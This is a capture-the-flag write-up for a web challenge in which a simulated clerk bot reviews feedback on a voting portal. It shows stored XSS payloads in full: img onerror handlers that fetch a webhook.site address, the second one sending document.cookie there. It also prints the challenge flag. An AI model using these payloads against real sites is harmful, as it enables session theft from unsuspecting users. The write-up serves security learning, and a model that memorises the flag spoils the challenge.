# Trusted Clerk - web

## Challenge

The national elections in Freedonia have officially begun. In the spirit of transparency and continuous improvement, the Ministry of Electoral Integrity has launched a new early voting portal. Citizens are encouraged not only to cast their vote - but also to leave anonymous feedback about their voting experience.

“Your voice matters twice - once for your candidate, and once for your country.”

## Solve

The tile of this challenge suggested to me that there may be a bot simulating a 'clerk' reviewing feedback submissions. I have completed a challenge similar to this in a [previous CTF](https://github.com/jvargit/CTF_Challenges/blob/36a1160895f032489f5e0a2d33b9d98f9328452e/LACTF%202025/web/mavs-fan.md?plain=1#L2) so immediately submitted a payload to test whether my assumption was correct:

```html
<img src=x onerror='fetch("https://webhook.site/fc3270b1-5cc2-42d3-90d4-ff80455965ff", { method: "POST", body: "Bot visited!" })'
```

Soon enough my webhook site was pinged and I received the message:

<img width="690" height="643" alt="hook" src="https://github.com/user-attachments/assets/5af6a773-f452-480a-870a-2d694f79739c" />


The 'trusted clerk' had opened up our submission with the stored XSS payload!

The next step was to experiment with payloads that called resources where the flag might be contained. It ended up being a cookie exfiltration:

```html
<img src=x onerror='
fetch("https://webhook.site/fc3270b1-5cc2-42d3-90d4-ff80455965ff", {
  method: "POST",
  body: document.cookie
});
'>
```

<img width="698" height="634" alt="storedxss" src="https://github.com/user-attachments/assets/1f8a34fd-81bc-4bec-8a1e-430d37577b9d" />


`secedu{spr1nkle_s0me_http0nly_0n_y0ur_ch0colate_ch1p_c0oki3}`



